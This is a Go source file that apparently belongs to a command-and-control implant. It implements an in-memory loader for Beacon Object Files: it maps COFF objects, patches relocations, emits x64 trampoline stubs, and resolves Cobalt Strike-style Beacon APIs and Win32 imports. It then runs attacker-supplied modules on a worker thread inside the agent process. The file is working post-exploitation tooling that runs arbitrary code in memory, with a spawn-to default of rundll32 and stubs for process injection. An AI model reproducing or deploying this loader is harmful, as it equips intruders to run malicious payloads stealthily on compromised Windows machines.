//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"sync"
	"syscall"
	"unsafe"
)

// Minimal in-process COFF/BOF loader (x64): maps Relocatable objects,
// applies relocations, resolves Beacon plus Win32 imports, and runs the
// entrypoint on a worker thread with a timeout. BOF output (BeaconPrintf
// / BeaconOutput) is captured into the task result.
//
// Varargs forwarding: a BOF calls BeaconPrintf like any x64 function, so
// the Go callback would only see the four register slots. Instead each
// printf-like Beacon function points at a small emitted stub that spills
// the registers plus the outgoing-argument pointer into a context block
// and calls Go with that single pointer; formatBeacon then interprets
// the full argument list.

var (
	k32                   = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc      = k32.NewProc("VirtualAlloc")
	procVirtualProtect    = k32.NewProc("VirtualProtect")
	procVirtualFree       = k32.NewProc("VirtualFree")
	procCreateThread      = k32.NewProc("CreateThread")
	procWaitSingle        = k32.NewProc("WaitForSingleObject")
	procCloseHandle       = k32.NewProc("CloseHandle")
	procGetModuleHandleA  = k32.NewProc("GetModuleHandleA")
	procGetProcAddress    = k32.NewProc("GetProcAddress")
	procLoadLibraryA      = k32.NewProc("LoadLibraryA")
	procGetProcessHeap    = k32.NewProc("GetProcessHeap")
	procHeapAlloc         = k32.NewProc("HeapAlloc")
	procHeapFree          = k32.NewProc("HeapFree")
	procFlushIcache       = k32.NewProc("FlushInstructionCache")
	procVirtualQuery      = k32.NewProc("VirtualQuery")
	procGetCurrentProcess = k32.NewProc("GetCurrentProcess")
	procIsUserAnAdmin     = syscall.NewLazyDLL("shell32.dll").NewProc("IsUserAnAdmin")
)

const (
	memCommitReserve = 0x3000
	memRelease       = 0x8000
	pageReadWrite    = 0x04
	pageExecuteRead  = 0x20
	waitObject0      = 0x0
	waitTimeout      = 0x102
	infinite         = 0xFFFFFFFF
)

// beaconState holds one BOF run: captured output plus live format buffers.
// Dispatch runs tasks sequentially, but callbacks arrive on the BOF worker
// thread, so everything goes through the mutex.
type beaconFormat struct {
	data   []byte
	allocs []uintptr // HeapAlloc copies handed out by ToString
}

type beaconRun struct {
	mu      sync.Mutex
	out     []byte
	formats map[uintptr]*beaconFormat
	next    uintptr
}

var currentBeaconRun *beaconRun

func beaconAppend(b []byte) {
	r := currentBeaconRun
	if r == nil {
		return
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	if len(r.out) >= maxBeaconOutput {
		return
	}
	room := maxBeaconOutput - len(r.out)
	if len(b) > room {
		b = b[:room]
	}
	r.out = append(r.out, b...)
}

func readCString(p uintptr) string {
	if p == 0 {
		return ""
	}
	var b []byte
	for i := 0; i < maxBeaconOutput; i++ {
		c := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

func readWideString(p uintptr) string {
	if p == 0 {
		return ""
	}
	var u []uint16
	for i := 0; i < maxBeaconOutput; i++ {
		w := *(*uint16)(unsafe.Pointer(p + uintptr(i*2)))
		if w == 0 {
			break
		}
		u = append(u, w)
	}
	return syscall.UTF16ToString(u)
}

var beaconMem = beaconReader{bytes: readCString, wide: readWideString}

// datap mirrors the BOF-side parser struct (x64): original, buffer,
// length, size.
func datapField(parser uintptr, off int) uintptr {
	return *(*uintptr)(unsafe.Pointer(parser + uintptr(off)))
}

func datapInt32(parser uintptr, off int) int32 {
	return *(*int32)(unsafe.Pointer(parser + uintptr(off)))
}

func setDatapPtr(parser uintptr, off int, v uintptr) {
	*(*uintptr)(unsafe.Pointer(parser + uintptr(off))) = v
}

func setDatapInt32(parser uintptr, off int, v int32) {
	*(*int32)(unsafe.Pointer(parser + uintptr(off))) = v
}

func beaconDataParseCB(parser, buffer, size uintptr) uintptr {
	// Skip the u32LE total-length prefix, like BeaconDataParse.
	setDatapPtr(parser, 0, buffer)
	setDatapPtr(parser, 8, buffer+4)
	rest := int32(size) - 4
	if rest < 0 {
		rest = 0
	}
	setDatapInt32(parser, 16, rest)
	setDatapInt32(parser, 20, rest)
	return 0
}

func beaconDataIntCB(parser uintptr) uintptr {
	if datapInt32(parser, 16) < 4 {
		return 0
	}
	buf := datapField(parser, 8)
	v := *(*int32)(unsafe.Pointer(buf))
	setDatapPtr(parser, 8, buf+4)
	setDatapInt32(parser, 16, datapInt32(parser, 16)-4)
	return uintptr(uint32(v))
}

func beaconDataShortCB(parser uintptr) uintptr {
	if datapInt32(parser, 16) < 2 {
		return 0
	}
	buf := datapField(parser, 8)
	v := *(*uint16)(unsafe.Pointer(buf))
	setDatapPtr(parser, 8, buf+2)
	setDatapInt32(parser, 16, datapInt32(parser, 16)-2)
	return uintptr(v)
}

func beaconDataExtractCB(parser, sizePtr uintptr) uintptr {
	if datapInt32(parser, 16) < 4 {
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = 0
		}
		return datapField(parser, 8)
	}
	buf := datapField(parser, 8)
	l := int32(binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(buf))[:]))
	if l < 0 || l > datapInt32(parser, 16)-4 {
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = 0
		}
		return buf + 4
	}
	setDatapPtr(parser, 8, buf+4+uintptr(l))
	setDatapInt32(parser, 16, datapInt32(parser, 16)-4-l)
	if sizePtr != 0 {
		*(*int32)(unsafe.Pointer(sizePtr)) = l
	}
	return buf + 4
}

func beaconDataLengthCB(parser uintptr) uintptr {
	return uintptr(uint32(datapInt32(parser, 16)))
}

func beaconOutputCB(typ, data, length uintptr) uintptr {
	if data != 0 && length > 0 && length < maxBeaconOutput {
		beaconAppend((*[maxBeaconOutput]byte)(unsafe.Pointer(data))[:length:length])
	}
	return 0
}

func beaconGetValueCB(typ uintptr) uintptr { return 0 }

func beaconIsAdminCB() uintptr {
	r1, _, _ := procIsUserAnAdmin.Call()
	return r1
}

func beaconInformationCB(info uintptr) uintptr { return 0 }

func beaconUseTokenCB(token uintptr) uintptr { return 0 }

func beaconUnsupportedCB() uintptr { return 0 }

// memoryBasicInfo mirrors MEMORY_BASIC_INFORMATION (x64 layout).
type memoryBasicInfo struct {
	baseAddress       uintptr
	allocationBase    uintptr
	allocationProtect uint32
	_                 uint32
	regionSize        uintptr
	state             uint32
	protect           uint32
	typ               uint32
	_                 uint32
}

const memCommit = 0x1000

// printfSlots expands a trampoline context block into the data-argument
// slots: the two register slots plus stack slots from the outgoing area.
// Stack slots are probed with VirtualQuery first: a fresh thread commits
// little stack, so blind reads past the caller's frame would fault. Only
// slots the format demands are interpreted, and short reads surface as
// "(missing)" in the output instead of crashing the agent.
func printfSlots(ctx uintptr) []uintptr {
	regs := (*[5]uintptr)(unsafe.Pointer(ctx))
	slots := []uintptr{regs[2], regs[3]}
	stack := regs[4]
	var regionEnd uintptr
	for i := 0; i < 256; i++ {
		addr := stack + uintptr(i*8)
		if addr+8 > regionEnd || addr+8 < addr {
			var mbi memoryBasicInfo
			r1, _, _ := procVirtualQuery.Call(addr,
				uintptr(unsafe.Pointer(&mbi)), unsafe.Sizeof(mbi))
			if r1 == 0 || mbi.state != memCommit {
				break
			}
			regionEnd = mbi.baseAddress + mbi.regionSize
			if addr+8 > regionEnd || addr < mbi.baseAddress {
				break
			}
		}
		slots = append(slots, *(*uintptr)(unsafe.Pointer(addr)))
	}
	return slots
}

func beaconPrintfCB(ctx uintptr) uintptr {
	regs := (*[5]uintptr)(unsafe.Pointer(ctx))
	out := formatBeacon(readCString(regs[1]), printfSlots(ctx), beaconMem)
	if regs[0] != 0 {
		out = fmt.Sprintf("[type %d] %s", regs[0], out)
	}
	beaconAppend([]byte(out))
	return uintptr(len(out))
}

func beaconFormatAllocCB(buf, size uintptr) uintptr {
	r := currentBeaconRun
	if r == nil {
		return 0
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	r.next++
	h := r.next
	r.formats[h] = &beaconFormat{}
	return h
}

func beaconFormatLookup(h uintptr) *beaconFormat {
	r := currentBeaconRun
	if r == nil {
		return nil
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	return r.formats[h]
}

func beaconFormatResetCB(h uintptr) uintptr {
	if f := beaconFormatLookup(h); f != nil {
		f.data = nil
		freeFormatAllocs(f)
	}
	return 0
}

func freeFormatAllocs(f *beaconFormat) {
	heap, _, _ := procGetProcessHeap.Call()
	for _, p := range f.allocs {
		procHeapFree.Call(heap, 0, p)
	}
	f.allocs = nil
}

func beaconFormatFreeCB(h uintptr) uintptr {
	r := currentBeaconRun
	if r == nil {
		return 0
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	if f := r.formats[h]; f != nil {
		freeFormatAllocs(f)
		delete(r.formats, h)
	}
	return 0
}

func beaconFormatAppendCB(h, data, length uintptr) uintptr {
	f := beaconFormatLookup(h)
	if f == nil || data == 0 || length == 0 || length > maxBeaconOutput {
		return 0
	}
	chunk := (*[maxBeaconOutput]byte)(unsafe.Pointer(data))[:length:length]
	if len(f.data)+len(chunk) > maxBeaconOutput {
		chunk = chunk[:maxBeaconOutput-len(f.data)]
	}
	f.data = append(f.data, chunk...)
	return 0
}

func beaconFormatPrintfCB(ctx uintptr) uintptr {
	regs := (*[5]uintptr)(unsafe.Pointer(ctx))
	f := beaconFormatLookup(regs[0])
	if f == nil {
		return 0
	}
	out := formatBeacon(readCString(regs[1]), printfSlots(ctx), beaconMem)
	if len(f.data)+len(out) > maxBeaconOutput {
		out = out[:maxBeaconOutput-len(f.data)]
	}
	f.data = append(f.data, out...)
	return uintptr(len(out))
}

func beaconFormatToStringCB(h, sizePtr uintptr) uintptr {
	f := beaconFormatLookup(h)
	if f == nil {
		if sizePtr != 0 {
			*(*int32)(unsafe.Pointer(sizePtr)) = 0
		}
		return 0
	}
	heap, _, _ := procGetProcessHeap.Call()
	p, _, _ := procHeapAlloc.Call(heap, 0, uintptr(len(f.data)+1))
	if p == 0 {
		return 0
	}
	if len(f.data) > 0 {
		copy((*[maxBeaconOutput]byte)(unsafe.Pointer(p))[:len(f.data)], f.data)
	}
	*(*byte)(unsafe.Pointer(p + uintptr(len(f.data)))) = 0
	f.allocs = append(f.allocs, p)
	if sizePtr != 0 {
		*(*int32)(unsafe.Pointer(sizePtr)) = int32(len(f.data))
	}
	return p
}

func beaconFormatIntCB(h, value uintptr) uintptr {
	f := beaconFormatLookup(h)
	if f == nil {
		return 0
	}
	var b [4]byte
	binary.LittleEndian.PutUint32(b[:], uint32(value))
	if len(f.data)+4 <= maxBeaconOutput {
		f.data = append(f.data, b[:]...)
	}
	return 0
}

func beaconSpawnToCB(isX86, buf, length uintptr) uintptr {
	path := "C:\\Windows\\System32\\rundll32.exe"
	if isX86 != 0 {
		path = "C:\\Windows\\SysWOW64\\rundll32.exe"
	}
	if buf != 0 && length > 0 {
		raw := []byte(path)
		if len(raw)+1 > int(length) {
			raw = raw[:int(length)-1]
		}
		dst := (*[32768]byte)(unsafe.Pointer(buf))[:len(raw)+1]
		copy(dst, raw)
		dst[len(raw)] = 0
	}
	return 1
}

// importSearchOrder resolves plain Win32 imports (memcpy included: ntdll
// exports the CRT memory routines BOF compilers emit calls to).
var importSearchOrder = []string{
	"kernel32.dll", "ntdll.dll", "advapi32.dll", "user32.dll",
	"ws2_32.dll", "winhttp.dll", "iphlpapi.dll", "shell32.dll",
	"ole32.dll", "oleaut32.dll", "crypt32.dll", "netapi32.dll",
	"secur32.dll", "wtsapi32.dll", "psapi.dll", "version.dll",
}

func win32ProcAddress(name string) uintptr {
	symName, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	for _, dll := range importSearchOrder {
		dllPtr, err := syscall.BytePtrFromString(dll)
		if err != nil {
			continue
		}
		h, _, _ := procGetModuleHandleA.Call(uintptr(unsafe.Pointer(dllPtr)))
		if h == 0 {
			h, _, _ = procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllPtr)))
		}
		if h == 0 {
			continue
		}
		addr, _, _ := procGetProcAddress.Call(h, uintptr(unsafe.Pointer(symName)))
		if addr != 0 {
			return addr
		}
	}
	return 0
}

func allocExec(size int) (uintptr, error) {
	r1, _, _ := procVirtualAlloc.Call(0, uintptr(size), memCommitReserve, pageReadWrite)
	if r1 == 0 {
		return 0, fmt.Errorf("coff: VirtualAlloc failed")
	}
	return r1, nil
}

func makeExec(addr uintptr, size int) {
	var old uint32
	procVirtualProtect.Call(addr, uintptr(size), pageExecuteRead,
		uintptr(unsafe.Pointer(&old)))
	me, _, _ := procGetCurrentProcess.Call()
	procFlushIcache.Call(me, addr, uintptr(size))
}

// printfStubTemplate spills the four register arguments plus the outgoing
// stack-argument pointer into a 5-slot context block and calls the Go
// callback with its address. The imm64 at offset 41 is patched per stub.
var printfStubTemplate = []byte{
	0x48, 0x83, 0xEC, 0x48, // sub rsp, 72
	0x48, 0x89, 0x4C, 0x24, 0x20, // mov [rsp+32], rcx
	0x48, 0x89, 0x54, 0x24, 0x28, // mov [rsp+40], rdx
	0x4C, 0x89, 0x44, 0x24, 0x30, // mov [rsp+48], r8
	0x4C, 0x89, 0x4C, 0x24, 0x38, // mov [rsp+56], r9
	0x48, 0x8D, 0x44, 0x24, 0x70, // lea rax, [rsp+112] (= entry rsp+40: past ret + shadow)
	0x48, 0x89, 0x44, 0x24, 0x40, // mov [rsp+64], rax
	0x48, 0x8D, 0x4C, 0x24, 0x20, // lea rcx, [rsp+32]
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, callback
	0xFF, 0xD0, // call rax
	0x48, 0x83, 0xC4, 0x48, // add rsp, 72
	0xC3, // ret
}

// threadStubTemplate adapts the BOF entrypoint (buf, len) to a thread
// start routine. Immediates follow their 2-byte mov opcodes: buf at 14,
// len at 24, entry at 34.
var threadStubTemplate = []byte{
	0x55,             // push rbp
	0x48, 0x8B, 0xEC, // mov rbp, rsp
	0x48, 0x83, 0xE4, 0xF0, // and rsp, -16
	0x48, 0x83, 0xEC, 0x20, // sub rsp, 32
	0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0, // mov rcx, buf
	0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0, // mov rdx, len
	0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0, // mov rax, entry
	0xFF, 0xD0, // call rax
	0x33, 0xC0, // xor eax, eax
	0x48, 0x8B, 0xE5, // mov rsp, rbp
	0x5D, // pop rbp
	0xC3, // ret
}

func emitThreadStub(buf, length, entry uintptr) (uintptr, error) {
	addr, err := allocExec(len(threadStubTemplate))
	if err != nil {
		return 0, err
	}
	code := (*[51]byte)(unsafe.Pointer(addr))[:len(threadStubTemplate):len(threadStubTemplate)]
	copy(code, threadStubTemplate)
	binary.LittleEndian.PutUint64(code[14:], uint64(buf))
	binary.LittleEndian.PutUint64(code[24:], uint64(length))
	binary.LittleEndian.PutUint64(code[34:], uint64(entry))
	makeExec(addr, len(threadStubTemplate))
	return addr, nil
}

// beaconAddresses builds the Beacon import table for one run. Printf-like
// functions go through emitted stubs; the rest are direct Go callbacks
// (safe: x64 callees never clean the stack, so arity is flexible).
// beaconDirectAddrs returns the Go-callback addresses for the fixed-arity
// Beacon functions. Printf-like functions are stubbed separately (they
// need the varargs trampoline) and are absent here.
func beaconDirectAddrs() map[string]uintptr {
	return map[string]uintptr{
		"BeaconOutput":                 syscall.NewCallback(beaconOutputCB),
		"BeaconGetValue":               syscall.NewCallback(beaconGetValueCB),
		"BeaconDataParse":              syscall.NewCallback(beaconDataParseCB),
		"BeaconDataInt":                syscall.NewCallback(beaconDataIntCB),
		"BeaconDataShort":              syscall.NewCallback(beaconDataShortCB),
		"BeaconDataExtract":            syscall.NewCallback(beaconDataExtractCB),
		"BeaconDataLength":             syscall.NewCallback(beaconDataLengthCB),
		"BeaconFormatAlloc":            syscall.NewCallback(beaconFormatAllocCB),
		"BeaconFormatReset":            syscall.NewCallback(beaconFormatResetCB),
		"BeaconFormatFree":             syscall.NewCallback(beaconFormatFreeCB),
		"BeaconFormatAppend":           syscall.NewCallback(beaconFormatAppendCB),
		"BeaconFormatToString":         syscall.NewCallback(beaconFormatToStringCB),
		"BeaconFormatInt":              syscall.NewCallback(beaconFormatIntCB),
		"BeaconIsAdmin":                syscall.NewCallback(beaconIsAdminCB),
		"BeaconGetSpawnTo":             syscall.NewCallback(beaconSpawnToCB),
		"BeaconInformation":            syscall.NewCallback(beaconInformationCB),
		"BeaconUseToken":               syscall.NewCallback(beaconUseTokenCB),
		"BeaconInjectProcess":          syscall.NewCallback(beaconUnsupportedCB),
		"BeaconInjectTemporaryProcess": syscall.NewCallback(beaconUnsupportedCB),
		"BeaconSpawnTemporaryProcess":  syscall.NewCallback(beaconUnsupportedCB),
		"BeaconCleanupProcess":         syscall.NewCallback(beaconUnsupportedCB),
	}
}

// thunkSize is one import thunk: jmp [rip+0] plus the absolute target.
const thunkSize = 14

func writeThunk(dst []byte, target uintptr) {
	dst[0], dst[1], dst[2], dst[3], dst[4], dst[5] = 0xFF, 0x25, 0, 0, 0, 0
	binary.LittleEndian.PutUint64(dst[6:], uint64(target))
}

// buildPrintfStub returns the varargs trampoline with its callback patched.
func buildPrintfStub(callback uintptr) []byte {
	code := append([]byte(nil), printfStubTemplate...)
	binary.LittleEndian.PutUint64(code[41:], uint64(callback))
	return code
}

func freeExec(addr uintptr) {
	procVirtualFree.Call(addr, 0, memRelease)
}

func runCoffInProcess(obj []byte, entry string, args []byte, timeoutSec int) (string, error) {
	img, err := parseCoff(obj)
	if err != nil {
		return "", err
	}
	beacon := beaconDirectAddrs()
	// Collect the distinct undefined imports referenced by mapped
	// relocations; each gets a thunk below.
	var imports []string
	seen := map[string]bool{}
	for i := range img.sections {
		if !img.sections[i].mapped {
			continue
		}
		for _, rel := range img.sections[i].relocs {
			if int(rel.sym) >= len(img.symbols) {
				return "", fmt.Errorf("coff: section %s bad reloc symbol %d", img.sections[i].name, rel.sym)
			}
			sym := img.symbols[rel.sym]
			if sym.section != 0 || sym.name == "" {
				continue
			}
			if !seen[sym.name] {
				seen[sym.name] = true
				imports = append(imports, sym.name)
			}
		}
	}
	// Resolve absolute targets up front so unknown imports fail before
	// any code runs. Printf-likes resolve to in-image stubs later.
	targets := map[string]uintptr{}
	needPrintf, needFormat := false, false
	for _, name := range imports {
		switch name {
		case "BeaconPrintf":
			needPrintf = true
		case "BeaconFormatPrintf":
			needFormat = true
		default:
			if addr, ok := beacon[name]; ok {
				targets[name] = addr
				continue
			}
			if addr := win32ProcAddress(name); addr != 0 {
				targets[name] = addr
				continue
			}
			return "", fmt.Errorf("coff: unresolved import %s", name)
		}
	}
	// Lay out mapped sections at 32-byte alignment: code first on its own
	// pages, then data plus the args buffer, then one import thunk per
	// import plus the varargs stubs on their own pages. Thunks and stubs
	// live inside the image because REL32 calls only reach +-2GB while
	// Go callbacks and DLLs routinely sit farther away; the page splits
	// keep VirtualProtect RX ranges off writable data.
	const align = 32
	bases := make([]uintptr, len(img.sections))
	size := 0
	for i := range img.sections {
		if !img.sections[i].mapped || img.sections[i].flags&scnCntCode == 0 {
			continue
		}
		size = (size + align - 1) &^ (align - 1)
		bases[i] = uintptr(size)
		size += len(img.sections[i].data)
	}
	codeEnd := (size + 0xFFF) &^ 0xFFF
	size = codeEnd
	for i := range img.sections {
		if !img.sections[i].mapped || img.sections[i].flags&scnCntCode != 0 {
			continue
		}
		size = (size + align - 1) &^ (align - 1)
		bases[i] = uintptr(size)
		size += len(img.sections[i].data)
	}
	size = (size + 7) &^ 7
	argsOff := size
	size += len(args)
	thunkBase := (size + 0xFFF) &^ 0xFFF
	size = thunkBase + thunkSize*len(imports)
	printfOff, formatOff := -1, -1
	if needPrintf {
		printfOff = size
		size += len(printfStubTemplate)
	}
	if needFormat {
		formatOff = size
		size += len(printfStubTemplate)
	}
	if size == 0 {
		return "", fmt.Errorf("coff: nothing to map")
	}
	mem, err := allocExec(size)
	if err != nil {
		return "", err
	}
	// Abandoned on BOF timeout (below) rather than freed: a still-running
	// BOF would crash on freed memory, while a leak is only bytes.
	freed := false
	defer func() {
		if !freed {
			freeExec(mem)
		}
	}()
	image := (*[1 << 30]byte)(unsafe.Pointer(mem))[:size:size]
	for i := range img.sections {
		if !img.sections[i].mapped {
			continue
		}
		copy(image[bases[i]:], img.sections[i].data)
	}
	argsPtr := mem + uintptr(argsOff)
	copy(image[argsOff:], args)
	printfAddr, formatAddr := uintptr(0), uintptr(0)
	if needPrintf {
		printfAddr = mem + uintptr(printfOff)
		copy(image[printfOff:], buildPrintfStub(syscall.NewCallback(beaconPrintfCB)))
	}
	if needFormat {
		formatAddr = mem + uintptr(formatOff)
		copy(image[formatOff:], buildPrintfStub(syscall.NewCallback(beaconFormatPrintfCB)))
	}
	thunks := map[string]uintptr{}
	for i, name := range imports {
		off := thunkBase + i*thunkSize
		thunks[name] = mem + uintptr(off)
		target := targets[name]
		switch name {
		case "BeaconPrintf":
			target = printfAddr
		case "BeaconFormatPrintf":
			target = formatAddr
		}
		writeThunk(image[off:off+thunkSize], target)
	}
	resolve := func(sym coffSymbol) (uintptr, error) {
		if sym.section > 0 {
			if sym.section > len(img.sections) {
				return 0, fmt.Errorf("coff: symbol %s bad section %d", sym.name, sym.section)
			}
			if !img.sections[sym.section-1].mapped {
				return 0, fmt.Errorf("coff: symbol %s in unmapped section %s", sym.name, img.sections[sym.section-1].name)
			}
			return mem + bases[sym.section-1] + uintptr(sym.value), nil
		}
		if addr, ok := thunks[sym.name]; ok {
			return addr, nil
		}
		return 0, fmt.Errorf("coff: unresolved import %s", sym.name)
	}
	for i := range img.sections {
		sec := &img.sections[i]
		if !sec.mapped {
			continue
		}
		for _, rel := range sec.relocs {
			if int(rel.sym) >= len(img.symbols) {
				return "", fmt.Errorf("coff: section %s bad reloc symbol %d", sec.name, rel.sym)
			}
			target, err := resolve(img.symbols[rel.sym])
			if err != nil {
				return "", err
			}
			slot := mem + bases[i] + uintptr(rel.offset)
			// The original slot contents are the addend (a lea into
			// .rdata carries the string offset there; calls use 0).
			var addend uint64
			switch rel.typ {
			case relAMD64Addr64:
				if uint64(rel.offset)+8 > uint64(len(sec.data)) {
					return "", fmt.Errorf("coff: section %s reloc out of range", sec.name)
				}
				addend = binary.LittleEndian.Uint64((*[8]byte)(unsafe.Pointer(slot))[:])
				binary.LittleEndian.PutUint64((*[8]byte)(unsafe.Pointer(slot))[:], uint64(target)+addend)
			case relAMD64Addr32NB:
				if uint64(rel.offset)+4 > uint64(len(sec.data)) {
					return "", fmt.Errorf("coff: section %s reloc out of range", sec.name)
				}
				addend = uint64(binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(slot))[:]))
				binary.LittleEndian.PutUint32((*[4]byte)(unsafe.Pointer(slot))[:], uint32(target-mem)+uint32(addend))
			case relAMD64Rel32:
				if uint64(rel.offset)+4 > uint64(len(sec.data)) {
					return "", fmt.Errorf("coff: section %s reloc out of range", sec.name)
				}
				addend = uint64(binary.LittleEndian.Uint32((*[4]byte)(unsafe.Pointer(slot))[:]))
				binary.LittleEndian.PutUint32((*[4]byte)(unsafe.Pointer(slot))[:], uint32(target+uintptr(addend)-(slot+4)))
			default:
				return "", fmt.Errorf("coff: section %s unsupported reloc type %d", sec.name, rel.typ)
			}
		}
	}
	// Code pages and the thunk/stub tail execute; data stays writable.
	protect := func(off, length int) error {
		if length <= 0 {
			return nil
		}
		var old uint32
		r1, _, _ := procVirtualProtect.Call(mem+uintptr(off), uintptr(length), pageExecuteRead,
			uintptr(unsafe.Pointer(&old)))
		if r1 == 0 {
			return fmt.Errorf("coff: VirtualProtect failed")
		}
		return nil
	}
	if err := protect(0, codeEnd); err != nil {
		return "", err
	}
	if err := protect(thunkBase, size-thunkBase); err != nil {
		return "", err
	}
	entryAddr := uintptr(0)
	for _, sym := range img.symbols {
		if sym.name == entry && sym.section > 0 {
			if !img.sections[sym.section-1].mapped {
				return "", fmt.Errorf("coff: entrypoint %s in unmapped section", entry)
			}
			entryAddr = mem + bases[sym.section-1] + uintptr(sym.value)
			break
		}
	}
	if entryAddr == 0 {
		return "", fmt.Errorf("coff: entrypoint %q not found", entry)
	}
	stub, err := emitThreadStub(argsPtr, uintptr(len(args)), entryAddr)
	if err != nil {
		return "", err
	}
	defer freeExec(stub)

	currentBeaconRun = &beaconRun{formats: map[uintptr]*beaconFormat{}}
	thread, _, _ := procCreateThread.Call(0, 0, stub, 0, 0, 0)
	if thread == 0 {
		return "", fmt.Errorf("coff: CreateThread failed")
	}
	ms := uint64(timeoutSec) * 1000
	if ms > infinite-1 {
		ms = infinite - 1
	}
	wait, _, _ := procWaitSingle.Call(thread, uintptr(ms))
	procCloseHandle.Call(thread)
	out := string(currentBeaconRun.out)
	currentBeaconRun = nil
	if wait == waitTimeout {
		// The BOF thread keeps running detached; freeing the image
		// underneath it would crash the agent, so leak it instead.
		freed = true
		return "", fmt.Errorf("bof timed out after %ds", timeoutSec)
	}
	if wait != waitObject0 {
		return "", fmt.Errorf("coff: thread wait failed (%d)", wait)
	}
	return out, nil
}
